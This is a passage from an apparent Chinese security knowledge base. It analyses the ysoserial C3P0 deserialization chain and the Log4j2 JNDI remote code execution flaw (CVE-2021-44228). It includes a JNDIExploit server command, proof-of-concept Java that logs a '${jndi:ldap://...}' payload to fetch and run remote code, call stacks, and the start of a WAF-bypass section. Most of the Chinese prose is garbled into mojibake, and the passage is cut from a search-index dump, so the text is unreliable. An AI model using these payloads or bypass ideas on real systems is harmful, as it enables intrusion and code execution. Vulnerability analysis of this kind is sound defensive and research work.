(com.mchange.v2.naming) readObject:211, PoolBackedDataSourceBase (com.mchange.v2.c3p0.impl) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invokeReadObject:1185, ObjectStreamClass (java.io) readSerialData:2256, ObjectInputStream (java.io) readOrdinaryObject:2147, ObjectInputStream (java.io) readObject0:1646, ObjectInputStream (java.io) readObject:482, ObjectInputStream (java.io) readObject:440, ObjectInputStream (java.io) main:7, Main åˆ†æå †æ ˆå¯ä»¥çœ‹å‡ºï¼Œä¸€ç›´å„ç§readObjectååºåˆ—ï¼Œç›´åˆ°å…³é”®çš„PoolBackedDataSourceBase$readObjectï¼Œè¯´æ˜è¿™é‡Œæ˜¯æˆ‘ä»¬éœ€è¦è§‚å¯Ÿçš„å…¥å£ç‚¹ åˆ†æä¸€ä¸‹ä»£ç ï¼Œoisæ˜¯æˆ‘ä»¬ä¼ å…¥çš„åºåˆ—åŒ–åçš„æ•°æ®ï¼Œååºåˆ—åŒ–åå¾—åˆ°å¯¹è±¡o,è€Œoå°±æ˜¯ä¸€ä¸ªæ¶æ„çš„ReferenceSerializedç±»ï¼Œç„¶åä¼šè°ƒç”¨getObjectæ–¹æ³• è·Ÿè¿›ï¼Œå‘ç°è°ƒç”¨äº†ReferenceableUtils.referenceToObjectæ–¹æ³•ï¼Œå­—é¢æ„æ€å°±æ˜¯ï¼šç»™referenceå¯¹è±¡è½¬æ¢æˆobjectå¯¹è±¡ï¼Œå¯ä»¥ç†è§£ä¸ºè¿œç¨‹ä¸‹è½½åŠ è½½åˆ°æœ¬åœ°å§ ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°æ­¤å¤„åˆ©ç”¨URLClassLoaderæ„å»ºäº†ä¸€ä¸ªè¿œç¨‹åŠ è½½ç±»çš„åŠ è½½å™¨ï¼Œç„¶åä½¿ç”¨Class.forNameæ¥è¿œç¨‹åŠ è½½è¿™ä¸ªç±»ï¼ŒfClassNameä¸ºè¿œç¨‹åŠ è½½çš„ç±»åï¼ˆæ­¤å¤„ä¼šå‘èµ·httpè¯·æ±‚è·å–æ¶æ„ç±»ï¼‰ æœ€åé€šè¿‡å®ä¾‹åŒ–è¯¥ç±»ï¼Œè§¦å‘æ¶æ„çš„æ„é€ å‡½æ•°ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ åæ¨è¿‡ç¨‹ æ ¹æ®æ•´ä¸ªååºåˆ—åŒ–çš„è¿‡ç¨‹ç†ä¸€ä¸‹ï¼Œçœ‹çœ‹æ€ä¹ˆç”ŸæˆPOC é¦–å…ˆéœ€è¦è§¦å‘PoolBackedDataSourceBase.readObject()ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åºåˆ—åŒ–çš„å¯¹è±¡å¿…é¡»æ˜¯PoolBackedDataSourceBaseç±» å…¶æ¬¡æ ¹æ®readObjectä¸­çš„åˆ¤å®šo instanceof IndirectlySerializedï¼Œæ‰€ä»¥æˆ‘ä»¬åºåˆ—åŒ–çš„å¯¹è±¡éœ€è¦æ˜¯IndirectlySerializedçš„å­ç±» åºåˆ—åŒ–å¯¹è±¡åŒæ—¶è¿˜éœ€è¦åŒ…å«æ˜¯ä¸€ä¸ªæ¶æ„çš„Referenceç±»å¯¹è±¡ æœ€åé€šè¿‡writeObjectè¿›è¡Œåºåˆ—åŒ– æ‰€ä»¥ç”Ÿæˆä¸€ä¸ªæ¶æ„åºåˆ—åŒ–çš„æ•°æ®çš„æ€è·¯ç®€åŒ–ä¸€ä¸‹ï¼šåˆ›å»ºä¸€ä¸ªPoolBackedDataSourceBaseç±»å¯¹è±¡ï¼Œç„¶åç»™ä»–åŒ…è£…æˆä¸€ä¸ªæ¶æ„çš„Referenceç±»ï¼Œå†åŒ…è£…æˆå¯åºåˆ—åŒ–çš„ï¼Œæœ€ååºåˆ—åŒ–å³å¯ ç”Ÿæˆé“¾åˆ†æ IDEAé…ç½® IDEAè°ƒè¯•ysoserialï¼Œé…ç½®ä¸€ä¸‹C3P0çš„ç”Ÿæˆå‚æ•° è¿è¡ŒGeneratePayloadï¼Œèƒ½çœ‹åˆ°è¾“å‡ºï¼Œè¯´æ˜æˆåŠŸ å¼€å§‹è°ƒè¯• ç”Ÿæˆçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨getObjectå‡½æ•°å¼€å§‹ï¼Œæ‰€ä»¥è¿™é‡Œä¸‹ä¸€ä¸ªæ–¹æ³•æ–­ç‚¹ è¿è¡Œåï¼Œä¼šåˆ°æ–­ç‚¹å¤„åœæ­¢ï¼Œå‰é¢ä¸€éƒ¨åˆ†æ˜¯åˆ¤æ–­å‘½ä»¤å‚æ•°æ˜¯å¦æ­£ç¡®çš„å†…å®¹ï¼Œå¯ä»¥ä¸ç”¨å¤ªå…³æ³¨ï¼Œæˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥çš„F8 åˆ°äº†54è¡Œï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†Reflections.createWithoutConstructor(PoolBackedDataSource.class) ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯é€šè¿‡åå°„åˆ›å»ºäº†ä¸€ä¸ªcom.mchange.v2.c3p0.PoolBackedDataSourceç±»å¯¹è±¡b ç„¶åå°†å¯¹è±¡bçš„å­—æ®µconnectionPoolDataSourceçš„å€¼é€šè¿‡åå°„è®¾ç½®ä¸ºæˆ‘ä»¬åˆ›å»ºçš„PoolSourceç±»ï¼Œå‚æ•°ä¸ºæˆ‘ä»¬ä¼ å…¥çš„URLå’Œç±»å connectionPoolDataSourceåœ¨åç»­çš„è¿‡ç¨‹ä¸­ä¼šå‘ç°å…¶å®šä¹‰æ˜¯ConnectionPoolDataSource connectionPoolDataSourceï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç¼–å†™PoolSourceçš„æ—¶å€™ç»§æ‰¿äº†ConnectionPoolDataSourceæ¥å£ æœ€åè¿”å›å¯¹è±¡b ç»§ç»­F8ï¼Œå‘ç°æ­¤å¤„ä¼šè¿›è¡Œåºåˆ—åŒ– ä¼ å…¥çš„å‚æ•°æ˜¯æˆ‘ä»¬åˆšæ‰ç”Ÿæˆçš„PoolBackedDataSourceå¯¹è±¡bï¼Œè·Ÿè¿› å‘ç°æœ€åä¼šè°ƒç”¨writeObjectè¿›è¡Œåºåˆ—åŒ–ï¼Œè·Ÿè¿›ï¼Œå¯¹æˆ‘ä»¬åå°„èµ‹å€¼çš„connectionPoolDataSourceåºåˆ—åŒ–ä¼šåˆ°è¾¾PoolBackedDataSourceBase.writeObject()ä¸­ åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå› ä¸ºæˆ‘ä»¬åºåˆ—åŒ–å¯¹è±¡objçš„å˜é‡connectionPoolDataSourceçš„å€¼C3P0$PoolSourceç±»ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œæ²¡æœ‰å£°æ˜åºåˆ—åŒ–æ¥å£ ç»§ç»­å‘ä¸‹ï¼Œä¼šæ–°å»ºä¸€ä¸ªå¯¹è±¡indirectorï¼Œç„¶åè°ƒç”¨å®ƒçš„indirectForm()æ–¹æ³•ï¼Œå‚æ•°ä¸ºæˆ‘ä»¬åå°„è®¾ç½®çš„å­—æ®µconnectionPoolDataSourceï¼Œè·Ÿä¸€ä¸‹ å‘ç°ä¼šå…ˆç»™origè½¬æ¢æˆReferemceableç±»ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºå•¥C3P0$PoolSourceè¦å®ç°Referenceableæ¥å£ï¼Œç„¶åè°ƒç”¨getReference()æ–¹æ³•ï¼Œç›¸å½“äºè°ƒç”¨çš„C3P0$PoolSource@getReference()æ–¹æ³•ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥åœ¨ysoserialä¸­çœ‹åˆ°çš„é‡å†™çš„æ–¹æ³• è·Ÿè¿›ï¼Œå‘ç°å°±æ˜¯è¿”å›äº†ä¸€ä¸ªJNDIçš„Referenceï¼Œå¦‚æœ\"exploit\"ç±»ä¸å­˜åœ¨ï¼Œå°±ä¼šä»æˆ‘ä»¬æŒ‡å®šçš„URLä¸ŠåŠ è½½æ¶æ„çš„ç±» è¿”å›Referenceåï¼Œå†é€šè¿‡ReferenceSerializedè¿›è¡Œåºåˆ—åŒ– è·Ÿè¿›å‘ç°ï¼Œå…¶å®å°±æ˜¯å£°æ˜äº†å¯åºåˆ—åŒ– æœ€åè¿”å›åˆ°PoolBackedDataSourceBase.writeObject()ä¸­ï¼Œå†æ¬¡writeObject()ï¼Œè¿™ä¸ªæ—¶å€™åºåˆ—åŒ–çš„ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªå¯åºåˆ—åŒ–çš„æ¶æ„çš„Reference æ€»ç»“ æ„Ÿè§‰æ€è·¯å¾ˆç®€å•ï¼š åˆ›å»ºä¸€ä¸ªcom.mchange.v2.c3p0.PoolBackedDataSourceå¯¹è±¡ é€šè¿‡åå°„å°†å…¶å­—æ®µconnectionPoolDataSourceçš„å€¼è®¾ç½®æˆæˆ‘ä»¬ç¼–å†™çš„PoolSourceç±»ï¼Œè¿™ä¸ªç±»éœ€è¦ä¼ å…¥urlåœ°å€å’Œæ¶æ„çš„ç±»åï¼Œä¸”é‡å†™getReferenceæ–¹æ³•ï¼Œé‡å†™æ–¹æ³•ä¸»è¦æ˜¯è¿”å›ä¸€ä¸ªæ¶æ„çš„JNDI Reference åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå› ä¸ºæˆ‘ä»¬ç¼–å†™çš„ç±»PoolSourceä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡åºåˆ—åŒ–æŠ›å‡ºå¼‚å¸¸ï¼Œä¼šè¿›å…¥åˆ°catchä¸­å†æ¬¡åºåˆ—åŒ– catchä¸­çš„åºåˆ—åŒ–ä¹‹å‰ï¼Œä¼šè°ƒç”¨PoolSource.getReferenceè·å–ä¸€ä¸ªæ¶æ„ç±»ï¼Œç„¶åå£°æ˜ä¸ºå¯åºåˆ—åŒ–çš„ï¼Œå†åºåˆ—åŒ–ï¼Œå¾—åˆ°ç»“æœ å†æ€»ç»“ä¸€ä¸‹ï¼š ä¸»è¦æ˜¯PoolBackedDataSourceBaseè¿™ä¸ªç±»ä¸­çš„connectionPoolDataSourceè¿™ä¸ªå˜é‡å¯æ§ï¼Œä¸”è¿™ä¸ªå˜é‡åœ¨å†æ¬¡åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ç‰¹å®šçš„æ–¹æ³•ï¼ˆè¿™ä¸ªæ–¹æ³•å†…å®¹ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼‰ï¼Œæœ€åç”Ÿæˆä¸€ä¸ªæ¶æ„çš„å¯åºåˆ—åŒ–çš„JNDI Referenceï¼Œç„¶åè¾“å‡ºåºåˆ—åŒ–æ•°æ®ã€‚ å‚è€ƒ ysoserial-C3P0 ysoserial-C3P0 åˆ†æ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:00 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/09.log4j2_rceåˆ†æ.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/09.log4j2_rceåˆ†æ.html","title":"09.log4j2_rceåˆ†æ","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 å‰è¨€ å¤ç° pom.xml å¯åŠ¨JNDIæ³¨å…¥Server æ¼æ´ä»£ç  æ•ˆæœ åˆ†æ è°ƒç”¨æ ˆ Debugåˆ†æ æ€»ç»“ ä¸€ä¸ªå°å‘ å¸¸è§„ç»•è¿‡ å¤šä¸ª${}æ‰§è¡Œæµç¨‹ åˆ†éš”ç¬¦ å…¶ä»–è§£æå™¨åŠŸæ•ˆ ç»•è¿‡æ€è·¯ å¥‡æ·«æŠ€å·§ 2.15.0-rc1è¡¥ä¸ç»•è¿‡ 2.15.0-rc2ä¿®å¤ å½±å“èŒƒå›´ ä¿®å¤å»ºè®® å‰è¨€ 2021å¹´11æœˆ24æ—¥ï¼Œé˜¿é‡Œäº‘å®‰å…¨å›¢é˜Ÿå‘Apacheå®˜æ–¹æŠ¥å‘Šäº†Apache Log4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ 2021å¹´12æœˆ9æ—¥æ™šï¼Œå„å¤§å…¬ä¼—å·çªç„¶å‘å¸ƒæ¼æ´é¢„è­¦ 2021å¹´12æœˆ10æ—¥æ™šï¼Œå„å¤§å…¬ä¼—å·å¼€å§‹è¹­çƒ­åº¦ Apache Log4j2æ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ—¥å¿—è®°å½•å·¥å…·ã€‚è¯¥å·¥å…·é‡å†™äº†Log4jæ¡†æ¶ï¼Œå¹¶ä¸”å¼•å…¥äº†å¤§é‡ä¸°å¯Œçš„ç‰¹æ€§ã€‚è¯¥æ—¥å¿—æ¡†æ¶è¢«å¤§é‡ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¼€å‘è€…å¯èƒ½ä¼šå°†ç”¨æˆ·è¾“å…¥å¯¼è‡´çš„é”™è¯¯ä¿¡æ¯å†™å…¥æ—¥å¿—ä¸­ã€‚ ç”±äºApache Log4j2æŸäº›åŠŸèƒ½å­˜åœ¨é€’å½’è§£æåŠŸèƒ½ï¼Œæ”»å‡»è€…å¯ç›´æ¥æ„é€ æ¶æ„è¯·æ±‚ï¼Œè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ¼æ´åˆ©ç”¨æ— éœ€ç‰¹æ®Šé…ç½®ï¼Œç»é˜¿é‡Œäº‘å®‰å…¨å›¢é˜ŸéªŒè¯ï¼ŒApache Struts2ã€Apache Solrã€Apache Druidã€Apache Flinkç­‰å‡å—å½±å“ã€‚ æ­¤æ¬¡æ¼æ´è§¦å‘æ¡ä»¶ä¸ºåªè¦å¤–éƒ¨ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šè¢«æ—¥å¿—è®°å½•ï¼Œå³å¯é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ï¼ˆCNVD-2021-95914ã€CVE-2021-44228ï¼‰ å½±å“ç‰ˆæœ¬ï¼šApache Log4j 2.x 2.15.0-rc1 å­˜åœ¨è¡¥ä¸ç»•è¿‡ï¼Œä½†æ˜¯å¾ˆé¸¡è‚‹ å¤ç° è€è§„çŸ©ï¼Œå…ˆå¤ç°ï¼Œå†åˆ†æ pom.xml Jdk8u111 log4j-apiä¸æ˜¯å¿…é¡» org.apache.logging.log4j log4j-core 2.14.1 org.apache.logging.log4j log4j-api 2.14.1 å¯åŠ¨JNDIæ³¨å…¥Server java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 æ¼æ´ä»£ç  import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class Test { private static final Logger logger = LogManager.getLogger(Test.class); public static void main(String[] args) { logger.error(\"${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}\"); } } æ•ˆæœ åˆ†æ è°ƒç”¨æ ˆ åœ¨åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œå› ä¸ºæˆ‘ä»¬æ˜ç¡®çŸ¥é“è¦æ‰§è¡Œç³»ç»Ÿå‘½ä»¤è°ƒç”¨java.lang.Runtime#exec(java.lang.String[])ï¼Œæ‰€ä»¥åœ¨execæ–¹æ³•å¤„ä¸‹æ–­ç‚¹ï¼Œåˆ†æä¸€ä¸‹è°ƒç”¨æ ˆ è¿è¡Œè·å–è°ƒç”¨æ ˆ exec:485, Runtime (java.lang) :-1, ExploitgJlWqLWBF3 newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getObjectFactoryFromReference:163, NamingManager (javax.naming.spi) getObjectInstance:189, DirectoryManager (javax.naming.spi) c_lookup:1085, LdapCtx (com.sun.jndi.ldap) p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx) lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:94, ldapURLContext (com.sun.jndi.url.ldap) lookup:417, InitialContext (javax.naming) lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:9, Test æœ€æ˜æ˜¾çš„æ¼æ´è§¦å‘ç‚¹ï¼Œå°±æ˜¯åœ¨ç¬¬16è¡Œlookup:172, JndiManager (org.apache.logging.log4j.core.net) è·Ÿè¿‡å»çœ‹ä¸‹ï¼Œå…¸å‹çš„JNDIæ³¨å…¥ Debugåˆ†æ æ—¢ç„¶å·²ç»çŸ¥é“è°ƒç”¨æ ˆäº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ…¢æ…¢åˆ†æäº† ä»logger.errorä¸ºå…¥å£ï¼Œè·Ÿè¿›å»åä¼šå‰æœŸæœ‰ä¸€ç³»åˆ—çš„å’Œæˆ‘ä»¬åˆ†ææ— å…³çš„è¿‡ç¨‹ï¼Œä¸»è¦å°±æ˜¯å„ç§å¸¸è§„åŒ…è£…å’Œè°ƒç”¨ toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:9, Test ç„¶åä¸€ç›´åˆ°äº†org.apache.logging.log4j.core.layout.PatternLayout.PatternSerializer#toSerializable(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder)ï¼Œè¿™ä¸ªçš„ä¸»è¦åŠŸèƒ½å°±æ˜¯é€šè¿‡éå†formattersä¸€æ®µä¸€æ®µçš„æ‹¼æ¥è¾“å‡ºçš„å†…å®¹ å½“åˆ°äº†æ ¼å¼åŒ–æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹çš„æ—¶å€™ï¼ŒåŒæ ·çš„ä¼šè¿›è¡Œformatå¤„ç†ï¼Œè·Ÿè¿›å‘ç°ä¼šè°ƒç”¨converter.format()ï¼Œconverterå±äºMessagePatternConverterç±» æ‰€ä»¥å°±åˆ°äº†org.apache.logging.log4j.core.pattern.MessagePatternConverter#format åˆ†æä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœå†™å…¥çš„æ—¥å¿—å†…å®¹ä¸­åŒ…å«${ï¼Œå°±ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä»workingBuilderåˆ†å‰²å‡ºæ¥ï¼Œèµ‹å€¼ç»™valueï¼Œç„¶åè°ƒç”¨config.getStrSubstitutor().replace()æ–¹æ³• è·Ÿè¿›replace()ï¼Œä¼šè°ƒç”¨substitute()æ–¹æ³• åœ¨org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder, int, int, java.util.List)æ–¹æ³•ä¸­ï¼Œä¼šé¦–å…ˆéå†å­—ç¬¦ï¼Œé€šè¿‡æ­£åˆ™åˆ¤æ–­ï¼Œè·å–${å’Œ}çš„ä½ç½®ï¼Œæœ€åæˆªå–å‡º${å’Œ}ä¸­é—´çš„å†…å®¹ï¼Œå¾—åˆ°jndi:xxxx ç„¶åå†æ¬¡é€’å½’è°ƒç”¨substitute()ï¼Œç»§ç»­æˆªå–${}ä¸­çš„å†…å®¹ï¼Œä¸»è¦æ˜¯ä¸ºäº†åˆ¤æ–­æ˜¯å¦è¿˜æœ‰${}ï¼Œåç»­è¿˜æœ‰åˆ†éš”ç¬¦çš„åˆ¤æ–­ï¼Œå°±å…ˆä¸ç®¡äº† ä¸€ç›´è·Ÿåˆ°è§£æå˜é‡è¿™ï¼Œè·Ÿè¿›è¿™ä¸ªå‡½æ•° å¯ä»¥çŒœæµ‹resolverè§£ææ—¶æ”¯æŒçš„å…³é”®è¯æœ‰[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œåˆ©ç”¨çš„jndi:xxxåç»­å°±ä¼šç”¨åˆ°JndiLookupè¿™ä¸ªè§£æå™¨ è·Ÿè¿›lookupï¼Œå°±æ˜¯é€šè¿‡:åˆ†å‰²å‰é¢çš„å…³é”®è¯jndiéƒ¨åˆ†å’Œåé¢çš„payloadå†…å®¹éƒ¨åˆ†ï¼Œå†è·å–è§£æå™¨ï¼Œé€šè¿‡è§£æå™¨å»lookup ç»§ç»­è·Ÿè¿›org.apache.logging.log4j.core.lookup.JndiLookup#lookupï¼Œä¼šåˆå§‹åŒ–JNDIå®¢æˆ·ç«¯ï¼Œç»§ç»­è°ƒç”¨lookup å†è·Ÿè¿›å°±æ˜¯éå¸¸å¸¸è§„çš„JNDIæ³¨å…¥ç‚¹äº†ï¼Œåˆ†æä¹Ÿåˆ°æ­¤ç»“æŸ æ€»ç»“ æ€»ç»“ä¸€ä¸‹æ•´ä¸ªåˆ†æè¿‡ç¨‹ï¼Œä¹Ÿå¾ˆç®€å• å…ˆåˆ¤æ–­å†…å®¹ä¸­æ˜¯å¦æœ‰${}ï¼Œç„¶åæˆªå–${}ä¸­çš„å†…å®¹ï¼Œå¾—åˆ°æˆ‘ä»¬çš„æ¶æ„payload jndi:xxx åä½¿ç”¨:åˆ†å‰²payloadï¼Œé€šè¿‡å‰ç¼€æ¥åˆ¤æ–­ä½¿ç”¨ä½•ç§è§£æå™¨å»lookup æ”¯æŒçš„å‰ç¼€åŒ…æ‹¬date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4jï¼Œå¯ä»¥ç ”ç©¶ä¸‹å…¶ä»–çš„ï¼Œè¯´ä¸å®šæœ‰æ–‡ç« å¯åš ä¸€ä¸ªå°å‘ ç½‘ä¸Šæœ‰å„ç§ç™¾åº¦ã€icloudç­‰å¤§å‚å•†è¢«æ‰“çš„æƒ…å†µï¼Œä½†æ˜¯æœ€å¼€å§‹ä¸€ç›´è®¤ä¸ºåªæœ‰logger.error()æ‰ä¼šè§¦å‘ï¼Œæ‰€ä»¥ç™¾æ€ä¸å¾—å…¶è§£ï¼Œéš¾é“ç”¨æˆ·æœç´¢çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«ç™¾åº¦ç”¨logger.error()è®°å½•ä¸‹æ¥ï¼Ÿå¾ˆæ˜æ˜¾è¿™æ˜¯ä¸å¯èƒ½çš„å•Šï¼ï¼ï¼ åé¢ç ”ç©¶äº†åŠå¤©ï¼Œå¿½ç•¥äº†ç¬¬ä¸€å¥è¯ æ­¤æ¬¡æ¼æ´è§¦å‘æ¡ä»¶ä¸ºåªè¦å¤–éƒ¨ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šè¢«æ—¥å¿—è®°å½•ï¼Œå³å¯é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ åªè¦è¾“å…¥ä¼šè¢«è®°å½•ï¼Œå°±å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼›ä»€ä¹ˆæƒ…å†µä¸‹ä¼šè®°å½•å‘¢ï¼Ÿä¸»è¦ä»£ç è¿˜æ˜¯åœ¨ ä¸€ç›´è·Ÿåˆ°æœ€åï¼ŒintLevel >= level.intLevel()ä¸ºfalseï¼ŒintLevelä¸ºæˆ‘ä»¬ä½¿ç”¨çš„INFOç­‰çº§çš„å€¼200ï¼Œlevel.intLevel()åˆ™ä¸ºå½“å‰æ—¥å¿—è®°å½•ç­‰çº§ERRORçš„å€¼400 è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆlog4jé»˜è®¤æƒ…å†µä¸‹åªä¼šè®°å½•errorå’Œfatalçš„æ—¥å¿—ï¼Œå¦‚ä¸‹å›¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æµ‹è¯•çš„æ—¶å€™åªæœ‰logger.errorå’Œfatalçš„æ—¶å€™æ‰ä¼šè§¦å‘ã€‚ å› æ­¤å…¶ä»–æ—¥å¿—ç­‰çº§ä¹Ÿä¸æ˜¯ä¸èƒ½è§¦å‘ï¼Œä¿®æ”¹ä¸€ä¸‹æ—¥å¿—è®°å½•ç­‰çº§ï¼Œè®©å®ƒèƒ½å¤Ÿè®°å½•ä¸‹æ¥æˆ‘ä»¬è¾“å…¥çš„payloadï¼Œå°±å¯ä»¥è§¦å‘æ¼æ´äº† import org.apache.logging.log4j.Level; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import org.apache.logging.log4j.core.config.Configurator; public class Test { private static Logger logger = LogManager.getLogger(Test.class); public static void main(String[] args) { // ç¬¬ä¸€ä¸ªå‚æ•° \"Test\" ä¸ºç±»å Configurator.setLevel(\"Test\", Level.INFO); logger.info(\"${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}\"); } } å¸¸è§„ç»•è¿‡ ç°åœ¨å¾ˆå¤šWAFéƒ½æ˜¯æ£€æµ‹æ˜¯å¦å­˜åœ¨jndi:ç­‰å…³é”®è¯æ¥åˆ¤æ–­ï¼Œè¿™ä¸ªå¾ˆæ˜æ˜¾æ‹¦å¾—äº†ä¸€æ—¶ï¼Œæ‹¦ä¸äº†ä¸€ä¸–å•Šï¼ï¼ï¼ é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬ä¹Ÿçœ‹åˆ°äº†æœ‰å¾ˆå¤šå…¶ä»–çš„è§£æå™¨å¯ç”¨ï¼ŒåŒ…æ‹¬date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, 